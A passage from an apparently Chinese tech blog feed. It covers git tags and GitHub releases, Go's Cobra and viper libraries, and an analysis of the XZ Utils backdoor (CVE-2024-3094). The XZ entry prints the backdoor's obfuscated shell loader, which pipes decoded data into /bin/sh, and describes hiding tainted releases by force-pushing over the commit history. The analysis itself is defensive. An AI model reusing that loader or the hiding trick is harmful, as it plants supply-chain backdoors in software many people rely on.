        <content type="html"><![CDATA[<ul><li><a href="#tag">tag</a></li><li><a href="#github-release">github release</a></li></ul><h1 id="tag"><a href="#tag" class="headerlink" title="tag"></a>tag</h1><p><code>git tag</code>只能自己git命令打，没法在github上进行处理。git tag是独立于正常push存在的，比如新建一个tag然后push上去，不会有新commit。push tag仅是推了tag的名字而已。</p><pre><code>git tag 2.0# tag本质就是这个a参数 annotated，也可以附带message信息（通常较少见使用-m）git tag -a v1.0 -m &quot;Release version 1.0&quot;git tag&gt;&gt;&gt; 2.0# 方便未来checkout切换到tag表示的某具体版本git checkout v1.0</code></pre><p>以上仅仅是<strong>local tag</strong>，推tag上去需要执行命令</p><pre><code>git push origin --tags</code></pre><p>或者某个单一的tag</p><pre><code>git push origin &lt;tag&gt;</code></pre><p><img src="/2024/08/28/git/git-tag/git_tag.png" alt="git_tag"></p><h1 id="github-release"><a href="#github-release" class="headerlink" title="github release"></a>github release</h1><p>打了tag后，可以发布<code>release的tarballs的source code</code>或者<code>二进制文件</code>（这些功能是<strong>github特有功能</strong>，而<strong>非git</strong>自身能支持的功能）</p><p>比如，如果没有选择tag，那么你发布不成功release。如图我暂时保存为草稿，再选择个tag进行发布。点击“笔”那个进行编辑。</p><p><img src="/2024/08/28/git/git-tag/tag2.png" alt="tag2"></p><p><img src="/2024/08/28/git/git-tag/tag3.png" alt="tag3"></p><p>点击 发布release后，如下，可以看到这个tag的源代码，默认会以tar.gz和zip的形式放在release中，另外我们手动一个一个传的文件也在其中。</p><p><img src="/2024/08/28/git/git-tag/tag4.png" alt="tag4"></p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>cve-2024-3094(1)[Chinese]</title>
      <link href="/2024/08/27/code_audit/cve-2024-3094(1)/"/>
      <url>/2024/08/27/code_audit/cve-2024-3094(1)/</url>
      
        <content type="html"><![CDATA[<h3 id="CVE-2024-3094（一）"><a href="#CVE-2024-3094（一）" class="headerlink" title="CVE-2024-3094（一）"></a>CVE-2024-3094（一）</h3><h1 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h1><p>这次XZ投毒事件是典型的APT攻击。对投毒思路、后门运作机制和人员潜伏身法分析量大，本文对XZ后门投毒预计拆分三篇来分析：</p><pre><code>1.投毒背景与git手法2.后门代码与调试3.报告者发现此后门的分析工具与思路</code></pre><h1 id="TOC"><a href="#TOC" class="headerlink" title="TOC"></a>TOC</h1><ul><li><a href="#大纲">大纲</a></li><li><a href="#toc">TOC</a></li><li><a href="#简介">简介</a></li><li><a href="#时间线">时间线</a></li><li><a href="#发现者andres-freund的邮件报告">发现者Andres Freund的邮件报告</a><ul><li><a href="#审计顺序">审计顺序</a></li></ul></li><li><a href="#思考">思考</a></li><li><a href="#感悟">感悟</a></li><li><a href="#参考链接">参考链接</a></li></ul><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>微软在职员工<code>Andres Freund</code>在对Debian进行性能回归测试时，注意到SSH连接使用了意外高的CPU使用率，并使得<code>Valgrind</code>（内存调试工具）报错。</p><pre><code>Debian：Debian是众多Linux发行版的基础项目，如Kali，Ubuntu。此处指Andres Freund测试Debian的新版本（此Debian非稳定版本，因为集成有较新的xz的漏洞版本）。性能回归测试：一种测试方法，测试多模块集成系统时，比较正常运行与运行存在问题的模块调用差异。Valgrind：内存调试工具</code></pre><p><code>Andres Freund</code>随后开始进行审计，从异常的SSH顺藤摸瓜找到原因，被调用的XZ模块存在了隐秘的后门，并对该后门进行了git审计，发现此后门是由<code>Jia Tan</code>(名称<code>JiaT75</code>)在2024年2、3月份逐步将高度混淆的后门代码一点一点引入XZ项目。<code>Andres Freund</code>将代码反混淆并进行审计，得到基本的后门调用逻辑后，于2024年3月29日周五向openwall邮件上报了此次事件。</p><pre><code>XZ：开源的压缩工具，比如常见的.xz后缀的文件通常就是使用此工具进行压缩的。调用xz的命令如xz -d filename.xz，tar -xJf archive.tar.xz等。OpenWall：OpenWall是做Linux安全的知名社区。主要贡献为研究Linux安全，制作内核补丁，制作了OpenWall Linux（轻量级的安全强化的Linux系统）。</code></pre><p>攻击者<code>Jia Tan</code>在XZ项目的<code>5.6.0</code>和<code>5.6.1</code>的两个tag的release中植入了有后门的liblzma压缩包&lt;含实际后门<code>build-to-host.m4</code>&gt;（尽管liblzma本身就是xz的子库，但是此处<em>攻击者手动另上传了设置有后门的liblzma文件</em>），而在github项目源中看不到后门文件的存在（只在release的source.tar.gz和source.zip中）。</p><pre><code>tag：通常开发人员会标识一些特定的版本，在本地分支git tag打tag，然后使用git push origin –tags一类的命令上传tag到remote分支。release：常见于特定版本的产品发布场景。比如在github上，通常选择特定tag然后发布release，研发者上传自行构建、编译的二进制包和哈希验证。此release通常会把当前分支的不含git信息的源代码同样以tar.gz和zip形式打包一同放在release文件中。</code></pre><p>后门lzma存在IFUNC劫持。OpenSSH本身不会加载liblzma，但几个Linux发行版使用<code>RSA_public_decrypt</code>会加载<code>libsystemd</code>，进而加载lzma，让入侵者可以未授权控制整个机器。这导致使用漏洞版本的xz的Linux发行版开启SSHD服务，就会存在后门。攻击者通过该函数劫持，篡改了SSH通信协议的数个字节来验证特定私钥绕过访问认证。后门会对特定<em>Ed448私钥</em>提供远程代码执行。</p><p>从危害评估角度，攻击者<code>Jia Tan</code>从2月23日才开始，花了将近一个月的时间有计划插入后门，分别于2月24日和3月9日发布了存在后门的两个xz的release。3月29日发现者<code>Andres Freund</code>上报了漏洞和溯源报告。尽管XZ是一个非常广泛的Linux项目，但是并未直接被主流Linux的stable版本引入XZ的漏洞版本；仅少数的Linux不稳定版本使用到了XZ的漏洞版本。因此后门不算大规模普及，只有使用最新Linux的特定群体需要检查XZ版本。</p><p>从风险角度，出事项目XZ是OSS（Open Source Software）高度知名组件，攻击者<code>Jia Tan</code>花费了近3年时间取得XZ项目创建者<code>Lasse Collin</code>的信任，才于2月23日开始在XZ项目中植入后门。如果没有人发现<code>Jia Tan</code>极其隐秘的高超手法，则该APT攻击将大规模对Linux植入后门。</p><h1 id="时间线"><a href="#时间线" class="headerlink" title="时间线"></a>时间线</h1><ul><li>2021年GitHub用户Jia Tan(JiaT75)帐户创建</li><li>2022年2月6日JiaT75向XZ仓库提交了第一个commit</li><li>2023年6月27日、28日Jia Tan对XZ Utils进行为未来漏洞利用的更改。在这些更改中，添加了对crc64_fast.c的ifunc实现的支持。</li><li>2023年7月8日JiaT75在oss-fuzz中打开了一个Pull请求，该项目对XZ和许多其他OSS项目进行模糊测试。PR禁用了ifunc模糊测试，进而阻止oss-fuzz发现XZ的恶意更改。</li><li>2024年2月15日JiaT75修改.gitignore文件，添加了build-to-host.m4的忽略规则。build-to-host.m4脚本文件即将包含在实际发布包（3.6.0与3.6.1）中，在构建期间执行，包含恶意代码，可初始化受害者机器上的后门安装。</li><li><p>2024年2月23日JiaT75在XZ仓库添加两个恶意文件：</p><p>  tests/files/bad-3-corrupt_lzma2.xz<br>  tests/files/good-large_compressed.lzma</p></li><li><p>2024年2月24日JiaT75发布恶意build-to-host.m4的5.6.0版本。在此阶段，后门已成功实行。Debian、Gentoo、Arch Linux、Fedora、openSUSE已使用xz-utils 5.6.0版本。</p></li><li>2024年3月9日JiaT75将后门的二进制文件更新为改进版本，并发布release 5.6.1。此版本5.6.1被Fedora、Gentoo、Arch Linux、openSUSE、Alpine、Debian使用。</li><li>2024年3月29日，Andres Freund向oss-security mailing list上报此次事件。</li><li>2024年3月30日，XZ项目创建者Lasse Collins对恶意代码做出声明和响应。</li></ul><h1 id="发现者Andres-Freund的邮件报告"><a href="#发现者Andres-Freund的邮件报告" class="headerlink" title="发现者Andres Freund的邮件报告"></a>发现者Andres Freund的邮件报告</h1><p>本节对<code>Andres Freund</code>的给openwall的邮件做中文复述，携带个人部分主观审视、学习和推测。该邮件原文link如下，读者可自行品味原味：<a href="https://www.openwall.com/lists/oss-security/2024/03/29/4">https://www.openwall.com/lists/oss-security/2024/03/29/4</a></p><p><code>Andres Freund</code>过去几周在使用Debian Sid时，发现SSH占用率高的奇怪现象，得到结论：上游的xz仓库的release的代码压缩包已被人植入后门。</p><pre><code>上游：指根源的代码仓库，也就是XZ本身的github仓库的意思，而非Debian自己修改的版本。比如Debian是非常知名的Linux项目，他会集成其他GNU的开源项目（上游）作为自身的工具。比如xz是开源压缩程序，他会把xz的有tag版本的代码包集成入自己的工具项目。通常情况下，为了更好的集成效果，Debian开发者会对拉来的XZ代码进行一些修改（此时称下游）。</code></pre><p>最开始以为是Debian自己的集成团队修改XZ导致的软件异常现象，但是经过溯源，Andres Freund确定是XZ本身。</p><h3 id="审计顺序"><a href="#审计顺序" class="headerlink" title="审计顺序"></a>审计顺序</h3><ol><li>Debian自己拉取的XZ仓库。</li></ol><p>link: <a href="https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63">https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63</a></p><p>如图是Debian Linux项目，其拉取了Xz项目作为子项目，书写本文时还可以看到漏洞版本的XZ。XZ原封不动的拿过来，会按照源项目的版本命名，直接给其同命名分支，如<code>v5.6.0</code>。如果为了集成需要，Debian会命名<code>v5.6.0-0.1</code>这样子的分支名。</p><p><img src="/2024/08/27/code_audit/cve-2024-3094(1)/md11.png" alt="md11"></p><ol><li>XZ项目</li></ol><p>确定Debian项目存在此后门后，进一步审计到软件供应链上游的XZ项目。发现github项目本身历史commit和漏洞版本的分支并没有后门，但是后门仅在漏洞版本的release的源代码压缩包。</p><p>后门版本的源代码没有后门，但是release有，其两个后门版本的link：</p><p><a href="https://github.com/tukaani-project/xz/releases/tag/v5.6.0">https://github.com/tukaani-project/xz/releases/tag/v5.6.0</a></p><p><a href="https://github.com/tukaani-project/xz/releases/tag/v5.6.1">https://github.com/tukaani-project/xz/releases/tag/v5.6.1</a></p><p><img src="/2024/08/27/code_audit/cve-2024-3094(1)/md12.png" alt="md12"></p><p><img src="/2024/08/27/code_audit/cve-2024-3094(1)/md13.png" alt="md13"></p><p>我看到此处时愣了一下，因为github发布release一般就是为了发布开发者自己编译的二进制文件，一般流程是：</p><pre><code>local打tag-&gt;推送tag到远程分支-&gt;指定tag发布release</code></pre><p>此时release默认有源代码压缩包（如上图的zip和tar.gz默认就存在的两个格式的源代码压缩包），但是一般没想过release后把这个commit删除。</p><p>我自己测试了一下，其实在<code>release</code>之后，<code>git reset</code>到<strong>之前commit</strong>再<code>git push --force</code>就可以实现这个手法。<strong>release包含后门</strong>，但是我又让<strong>源代码的commit回滚到没有后门的时候</strong>。</p><pre><code>local打tag-&gt;推送tag到远程分支-&gt;指定tag发布release-&gt;local git reset-&gt;git push origin --force</code></pre><p>这个细节非常实用，<strong>release的默认源码压缩包没有任何git信息</strong>，但是Debian那边的习惯又<em>只是看上游软件库的特定Tag和Release拿Tarball包</em>。攻击者摸清Debian集成上游代码的习惯，巧妙利用了release没有git信息很难发现的特性。</p><pre><code>Tarball：压缩包，基本指release默认的Tar.gz和Zip的源代码包。</code></pre><p>以上就是投毒手法，发现者随后简单审计和列举了恶意代码运行机制，此处摘取一处代码混淆片段：</p><pre><code>tests/files/bad-3-corrupt_lzma2.xztests/files/good-large_compressed.lzm</code></pre><p>其中：</p><pre><code>export i=&quot;((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +724)&quot;;(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr &quot;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&quot; &quot;\0-\377&quot;)|xz -F raw --lzma1 -dc|/bin/sh</code></pre><p>上述代码会加载恶意代码进入<code>liblzma_la-crc64-fast.o</code>，该代码只针对RPM或debian构建的x86-64架构的linux，如下Florian Weimer从该库文件提取的部分影响片段：</p><pre><code>if ! (echo &quot;$build&quot; | grep -Eq &quot;^x86_64&quot; &gt; /dev/null 2&gt;&amp;1) &amp;&amp; (echo &quot;$build&quot; | grep -Eq &quot;linux-gnu$&quot; &gt; /dev/null 2&gt;&amp;1);thenBuilding with gcc and the gnu linker    if test &quot;x$GCC&quot; != &#39;xyes&#39; &gt; /dev/null 2&gt;&amp;1;then    exit 0    fi    if test &quot;x$CC&quot; != &#39;xgcc&#39; &gt; /dev/null 2&gt;&amp;1;then    exit 0    fi    LDv=$LD&quot; -v&quot;    if ! $LDv 2&gt;&amp;1 | grep -qs &#39;GNU ld&#39; &gt; /dev/null 2&gt;&amp;1;thenexit 0Running as part of a debian or RPM package build:    if test -f &quot;$srcdir/debian/rules&quot; || test &quot;x$RPM_ARCH&quot; = &quot;xx86_64&quot;;then</code></pre><p>再重新运行后门版本的Linux时，测试了下后门对SSH性能的影响，发现正常拒绝连接时的速度会慢三倍：</p><pre><code>time ssh nonexistant@...alhostbefore:nonexistant@...alhost: Permission denied (publickey).before:real    0m0.299suser    0m0.202ssys    0m0.006safter:nonexistant@...alhost: Permission denied (publickey).real    0m0.807suser    0m0.202ssys    0m0.006stime命令的**real**指实际使用时间，另外我们可以在输出中看到user时间和sys时间。user指用户态时间，比如我们写了计算密集型程序，该时间长，意味着CPU长时间处理我们的程序，与文件、网络IO无关；sys指内核态（或称system level），主要做调度硬件资源（如内存、其他硬件）、IO相关的CPU处理，如果我们写了高IO程序，则sys时间会长。</code></pre><h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><ol><li><p>这是典型的软件供应链投毒事件，攻击者从上游仓库入手，向Debian这种重量级开源产品投毒。<br>但是，如果投毒成功将在全世界范围内获取非常庞大的权限。我们没法保证这只是开源社区的一个个例，相信更多的人甚至包括非常优秀的审计专家，在遇到这次事件的发现者在测试程序时的问题，可能没有这么细心、耐心的审计溯源行为。</p></li><li><p>开源社区的git code review机制是否依然存在缺陷？</p><p> git项目运营者在merge别人代码是否会详尽检查code snippets？或者给了开发权限者以release、tag的权限，是否会审计tarball代码？或者是否允许非admin权限的开发者对分支进行push –force操作，进而方便开发者完成恶意commit然后回滚到无恶意代码的commit的虚晃一枪的操作？</p></li><li><p>攻击者关闭了Google的Oss Fuzz对开源产品进行的函数测试避免暴露，这意味着Google的Oss Fuzz不仅可审计崩溃异常，而且对安全事件有检测能力。此种源代码审计、构建Fuzz相关的测试类工具，可提醒开发者意识到恶意代码的存在。另外，发现者Andres Freund使用Valgrind这种内存分析工具意识到本次后门的存在。优秀的测试类工具在安全审计方面表现良好。</p></li><li><p>考虑到软件供应链安全，本次供应链路线虽然不长，但是考虑到开源社区上下游软件开发团队迥异，风格迥异，让专门的人进行代码审计确实比较为难人类。但是是否应该增加安全扫描工具，卡每一个环节？因为如果一个环节发现问题，那么投毒者处心积虑的供应链长线投毒则会暴露。</p></li><li><p>流量检测工具是否会检测SSH的特定字节是否异常？开发者构建了底层函数，使得SSH协议的特定字节从0x00到0x03不等，流量检测工具如果能注意到普通SSH协议应该不会有出格字节特征，这也可以增大异常问题。</p></li></ol><h1 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h1><ol><li>英文区的安全专家观点清晰，推理链之长，博客众多，开源社区高手众多。尽管有纰漏，但是我认为开源社区的DevOps、构建、测试工具相对国内大部分企业更严格、专业。</li><li>软件供应链安全，此领域研究在未来依然充满开拓性。</li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>参考链接不分先后。</p><p><a href="https://en.wikipedia.org/wiki/XZ_Utils_backdoor">https://en.wikipedia.org/wiki/XZ_Utils_backdoor</a><br><a href="https://www.openwall.com/lists/oss-security/2024/03/29/4">https://www.openwall.com/lists/oss-security/2024/03/29/4</a><br><a href="https://jfrog.com/blog/xz-backdoor-attack-cve-2024-3094-all-you-need-to-know/#jfrog-oss-tools-for-detecting-cve-2024-3094">https://jfrog.com/blog/xz-backdoor-attack-cve-2024-3094-all-you-need-to-know/#jfrog-oss-tools-for-detecting-cve-2024-3094</a><br><a href="https://github.com/tukaani-project/xz/tree/master/src/liblzma">https://github.com/tukaani-project/xz/tree/master/src/liblzma</a><br><a href="https://github.com/google/oss-fuzz/blob/master/docs/getting-started/new_project_guide.md">https://github.com/google/oss-fuzz/blob/master/docs/getting-started/new_project_guide.md</a></p>]]></content>
      
      
      <categories>
          
          <category> code-audit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Cobra</title>
      <link href="/2024/08/24/Go/Cobra/"/>
      <url>/2024/08/24/Go/Cobra/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#初始化项目">初始化项目</a></li><li><a href="#cobra结构体">cobra结构体</a></li><li><a href="#init">init</a></li><li><a href="#flag">flag</a></li><li><a href="#xxxcmd结构体方法执行顺序">xxxCmd结构体方法执行顺序</a></li><li><a href="#隐藏某个cobra命令的提示信息">隐藏某个cobra命令的提示信息</a></li></ul><p>参考链接：</p><pre><code>https://github.com/spf13/cobrahttps://github.com/spf13/cobra/blob/main/user_guide.mdhttps://github.com/spf13/cobra-cli/blob/main/README.mdhttps://blog.kelu.org/tech/2021/04/10/kubernetes-cobra.html</code></pre><h3 id="初始化项目"><a href="#初始化项目" class="headerlink" title="初始化项目"></a>初始化项目</h3><p>先go mod init 包名来初始化一个go.mod(参考本目录文章《goModInit》)</p><pre><code>go mod init github.com/senranja/PPP</code></pre><p>cd进入PPP目录后，使用cobra命令进行初始化</p><pre><code>cobra-cli init  --license apache  --author &quot;Steve Francia spf@spf13.com&quot;  初始化cobra项目cobra-cli add serve  添加子命令cobra-cli add create -p &#39;configCmd&#39; 指定父级命令创建子命令</code></pre><h3 id="cobra结构体"><a href="#cobra结构体" class="headerlink" title="cobra结构体"></a>cobra结构体</h3><p>其中app/cmd/root.go中，主要是围绕结构体 xxxCmd 来设置Use、Args、Long、Short、Run系列、等内容</p><p>//可以自定义任意Execute，反正得执行了 rootCmd.Execute() 这个函数</p><pre><code>func Execute() error &#123;    return rootCmd.Execute()&#125;</code></pre><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>//初始化的一个函数，在这里绑定各种flag。其中有P的时有缩写的，没P的是没有缩写的，没P的通常—radact就可以表示没有什么值</p><pre><code>func init() &#123;    cobra.OnInitialize(initConfig) //用来初始化日志级别相关的东西&#125;</code></pre><p>我们知道 init 函数是 Golang 中初始化包的时候第一个调用的函数。在 cmd/root.go 中我们可以看到 init 函数中调用了 cobra.OnInitialize(initConfig)，也就是每当执行或者调用命令的时候，它都会先执行 init 函数中的所有函数，然后再执行 execute 方法。该初始化可用于加载配置文件或用于构造函数等等，这完全依赖于我们应用的实际情况。</p><p>在初始化函数里面 cobra.OnInitialize(initConfig) 调用了 initConfig 这个函数，所有，当 rootCmd 的执行方法 RUN: func 运行的时候，rootCmd 根命令就会首先运行 initConfig 函数，当所有的初始化函数执行完成后，才会执行 rootCmd 的 RUN: func 执行函数。</p><pre><code>func initConfig() &#123;    if cfgFile != &quot;&quot; &#123;        // Use config file from the flag.        viper.SetConfigFile(cfgFile)    &#125; else &#123;        // Find home directory.        home, err := os.UserHomeDir()        cobra.CheckErr(err)        // Search config in home directory with name &quot;.cobra&quot; (without extension).        viper.AddConfigPath(home)        viper.SetConfigType(&quot;yaml&quot;)        viper.SetConfigName(&quot;.cobra&quot;)    &#125;    viper.AutomaticEnv()    if err := viper.ReadInConfig(); err == nil &#123;        fmt.Println(&quot;Using config file:&quot;, viper.ConfigFileUsed())    &#125;&#125;</code></pre><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><pre><code>rootCmd.PersistentFlags().StringVar(&amp;cfgFile, &quot;config&quot;, &quot;&quot;, &quot;config file (default is $HOME/.cobra.yaml)&quot;)rootCmd.PersistentFlags().StringP(&quot;author&quot;, &quot;a&quot;, &quot;YOUR NAME&quot;, &quot;author name for copyright attribution&quot;)rootCmd.PersistentFlags().StringVarP(&amp;userLicense, &quot;license&quot;, &quot;l&quot;, &quot;&quot;, &quot;name of license for the project&quot;)rootCmd.PersistentFlags().Bool(&quot;viper&quot;, true, &quot;use Viper for configuration&quot;)viper.BindPFlag(&quot;author&quot;, rootCmd.PersistentFlags().Lookup(&quot;author&quot;))viper.BindPFlag(&quot;useViper&quot;, rootCmd.PersistentFlags().Lookup(&quot;viper&quot;))viper.SetDefault(&quot;author&quot;, &quot;NAME HERE &lt;EMAIL ADDRESS&gt;&quot;)viper.SetDefault(&quot;license&quot;, &quot;apache&quot;)rootCmd.AddCommand(addCmd)rootCmd.AddCommand(initCmd)</code></pre><h3 id="xxxCmd结构体方法执行顺序"><a href="#xxxCmd结构体方法执行顺序" class="headerlink" title="xxxCmd结构体方法执行顺序"></a>xxxCmd结构体方法执行顺序</h3><pre><code>PersistentPreRunPreRunRunPostRunPersistentPostRun</code></pre><h3 id="隐藏某个cobra命令的提示信息"><a href="#隐藏某个cobra命令的提示信息" class="headerlink" title="隐藏某个cobra命令的提示信息"></a>隐藏某个cobra命令的提示信息</h3><pre><code>rootCmd.PersistentFlags().StringP(&quot;config&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)可以使用 MarkHidden() 函数来表示某个信息的隐藏rootCmd.PersistentFlags().MarkHidden(&quot;config&quot;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>viper</title>
      <link href="/2024/08/24/Go/viper/"/>
      <url>/2024/08/24/Go/viper/</url>
      
        <content type="html"><![CDATA[<p>github.com/spf13/viper: 读取配置文件</p><ul><li><a href="#优先级">优先级</a></li><li><a href="#直接设置环境">直接设置环境</a></li><li><a href="#读取配置文件">读取配置文件</a><ul><li><a href="#1-viperreadconfig--读取raw的配置文件本身">1. viper.ReadConfig: # 读取raw的配置文件本身</a></li><li><a href="#2-viperreadinconfig--viperreadinconfig读取某个配置文件">2. viper.ReadInConfig() # viper.ReadInConfig()读取某个配置文件</a></li></ul></li><li><a href="#写配置文件">写配置文件</a></li><li><a href="#run-time时盯配置文件是否有异动热加载配置因此不需要重启服务器就能让配置生效">Run time时盯配置文件是否有异动热加载配置。因此不需要重启服务器，就能让配置生效。</a></li><li><a href="#gitleaks案例读取rule这种列表的toml数据">gitleaks案例:读取[[Rule]]这种列表的toml数据</a></li><li><a href="#设置别名">设置别名</a></li><li><a href="#从ioreader读取配置例读取bindata打包文件到viper">从io.Reader读取配置，例：读取bindata打包文件到viper</a></li><li><a href="#绑定环境变量">绑定环境变量</a></li><li><a href="#前缀的设置">前缀的设置</a></li><li><a href="#unmarshal到结构体中">Unmarshal到结构体中</a></li><li><a href="#viper和cobra结合">viper和cobra结合</a></li><li><a href="#viper和pflag结合">viper和pflag结合</a></li><li><a href="#gitleaks案例同viper要求读取2个配置文件后者覆盖前者">gitleaks案例：同viper要求读取2个配置文件，后者覆盖前者</a></li><li><a href="#将viper中的toml读取到结构体">将viper中的toml读取到结构体</a></li></ul><p>参考链接：<br>    <a href="https://github.com/spf13/viper">https://github.com/spf13/viper</a><br>    <a href="https://juejin.cn/post/6844904051369312264">https://juejin.cn/post/6844904051369312264</a></p><h3 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h3><pre><code>explicit call to Setflagenvconfigkey/value storedefault</code></pre><h3 id="直接设置环境"><a href="#直接设置环境" class="headerlink" title="直接设置环境"></a>直接设置环境</h3><pre><code>viper.SetDefault(&quot;ContentDir&quot;, &quot;content&quot;)viper.SetDefault(&quot;LayoutDir&quot;, &quot;layouts&quot;)viper.SetDefault(&quot;Taxonomies&quot;, map[string]string&#123;&quot;tag&quot;: &quot;tags&quot;, &quot;category&quot;: &quot;categories&quot;&#125;)</code></pre><h3 id="读取配置文件"><a href="#读取配置文件" class="headerlink" title="读取配置文件"></a>读取配置文件</h3><p>支持配置文件格式：JSON, TOML, YAML, HCL, INI, envfile and Java Properties files</p><p>注意：viper的配置的键值是大小写不敏感的，对环境变量是大小写敏感的。一个viper实例支持多个路径环境（但是至少得提供一个），但是只支持解析1个配置文件</p><p>另外注意，在写gitleaks打包项目时注意到，viper在进行配置时可以配置路径、原生的配置文件、后缀名等等，但是读取的行为基本上时这两个函数：<br>Eg:</p><h5 id="1-viper-ReadConfig-读取raw的配置文件本身"><a href="#1-viper-ReadConfig-读取raw的配置文件本身" class="headerlink" title="1. viper.ReadConfig: # 读取raw的配置文件本身"></a>1. viper.ReadConfig: # 读取raw的配置文件本身</h5><pre><code>bindata_default_toml, _ := bindata.Asset(&quot;gitleaks-n-all-kill.toml&quot;)viper.SetConfigType(&quot;toml&quot;)if err := viper.ReadConfig(bytes.NewBuffer(bindata_default_toml)); err != nil &#123;    log.Fatal().Msgf(&quot;unable to load gitleaks config, err: %s&quot;, err)&#125;</code></pre><h5 id="2-viper-ReadInConfig-viper-ReadInConfig-读取某个配置文件"><a href="#2-viper-ReadInConfig-viper-ReadInConfig-读取某个配置文件" class="headerlink" title="2. viper.ReadInConfig() # viper.ReadInConfig()读取某个配置文件"></a>2. viper.ReadInConfig() # viper.ReadInConfig()读取某个配置文件</h5><pre><code>viper.SetConfigFile(cfgPath)          fmt.Print(&quot;已加载config参数&quot;)if err := viper.ReadInConfig(); err != nil &#123;    log.Fatal().Msgf(&quot;unable to load gitleaks config, err: %s&quot;, err)&#125;viper.SetConfigName(&quot;config&quot;) // name of config file (without extension)viper.SetConfigType(&quot;yaml&quot;) // REQUIRED if the config file does not have the extension in the nameviper.AddConfigPath(&quot;/etc/appname/&quot;)   // path to look for the config file inviper.AddConfigPath(&quot;$HOME/.appname&quot;)  // call multiple times to add many search pathsviper.AddConfigPath(&quot;.&quot;)               // optionally look for config in the working directoryerr := viper.ReadInConfig() // Find and read the config fileif err != nil &#123; // Handle errors reading the config file    panic(fmt.Errorf(&quot;fatal error config file: %w&quot;, err))&#125;if err := viper.ReadInConfig(); err != nil &#123;    if _, ok := err.(viper.ConfigFileNotFoundError); ok &#123;        // Config file not found; ignore error if desired    &#125; else &#123;        // Config file was found but another error was produced    &#125;&#125;// Config file found and successfully parsed</code></pre><p>另一个案例</p><pre><code>package main import ( &quot;fmt&quot; &quot;log&quot; &quot;github.com/spf13/viper&quot; ) func main() &#123;     viper.SetConfigName(&quot;config&quot;) viper.SetConfigType(&quot;toml&quot;) viper.AddConfigPath(&quot;.&quot;) //viper.ReadInConfig() 之前，可以先设置个默认值，配置文件此时还没解析，解析出来他自动覆盖这个默认值viper.SetDefault(&quot;redis.port&quot;, 6381)err := viper.ReadInConfig() if err != nil &#123; log.Fatal(&quot;read config failed: %v&quot;, err) &#125; fmt.Println(viper.Get(&quot;app_name&quot;)) fmt.Println(viper.Get(&quot;log_level&quot;)) fmt.Println(&quot;mysql ip: &quot;, viper.Get(&quot;mysql.ip&quot;)) fmt.Println(&quot;mysql port: &quot;, viper.Get(&quot;mysql.port&quot;)) fmt.Println(&quot;mysql user: &quot;, viper.Get(&quot;mysql.user&quot;)) fmt.Println(&quot;mysql password: &quot;, viper.Get(&quot;mysql.password&quot;)) fmt.Println(&quot;mysql database: &quot;, viper.Get(&quot;mysql.database&quot;)) fmt.Println(&quot;redis ip: &quot;, viper.Get(&quot;redis.ip&quot;)) fmt.Println(&quot;redis port: &quot;, viper.Get(&quot;redis.port&quot;)) &#125;</code></pre><h3 id="写配置文件"><a href="#写配置文件" class="headerlink" title="写配置文件"></a>写配置文件</h3><pre><code>viper.WriteConfig() // writes current config to predefined path set by &#39;viper.AddConfigPath()&#39; and &#39;viper.SetConfigName&#39;viper.SafeWriteConfig()viper.WriteConfigAs(&quot;/path/to/my/.config&quot;)viper.SafeWriteConfigAs(&quot;/path/to/my/.config&quot;) // will error since it has already been writtenviper.SafeWriteConfigAs(&quot;/path/to/my/.other_config&quot;)</code></pre><h3 id="Run-time时盯配置文件是否有异动热加载配置。因此不需要重启服务器，就能让配置生效。"><a href="#Run-time时盯配置文件是否有异动热加载配置。因此不需要重启服务器，就能让配置生效。" class="headerlink" title="Run time时盯配置文件是否有异动热加载配置。因此不需要重启服务器，就能让配置生效。"></a>Run time时盯配置文件是否有异动热加载配置。因此不需要重启服务器，就能让配置生效。</h3><pre><code>viper.OnConfigChange(func(e fsnotify.Event) &#123;    fmt.Println(&quot;Config file changed:&quot;, e.Name)&#125;)viper.WatchConfig()</code></pre><p>如：<br>    package main</p><pre><code>import (&quot;fmt&quot;&quot;log&quot;&quot;time&quot;&quot;github.com/spf13/viper&quot;)func main() 